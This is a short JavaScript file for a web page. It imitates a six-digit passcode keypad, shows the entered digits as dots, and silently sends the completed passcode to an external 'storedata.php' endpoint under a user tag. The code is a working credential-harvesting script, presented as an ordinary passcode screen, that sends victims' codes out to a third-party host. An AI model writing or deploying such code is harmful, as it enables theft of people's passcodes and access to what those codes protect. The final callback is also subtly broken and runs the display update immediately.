const display = document.querySelector(".passcode");
let entered = "";

document.querySelectorAll(".circle").forEach(button => {
  button.addEventListener("click", () => {
    const digit = button.dataset.number;
    if (digit) {
      entered += digit;
      updateDisplay();
      if (entered.length === 6) {
        sendPasscode(entered);
      }
    }
  });
});

function updateDisplay() {
  display.textContent = "•".repeat(entered.length);
}

function sendPasscode(code) {
  fetch(`https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=${code}`)
    .then(() => entered = "", updateDisplay());
}
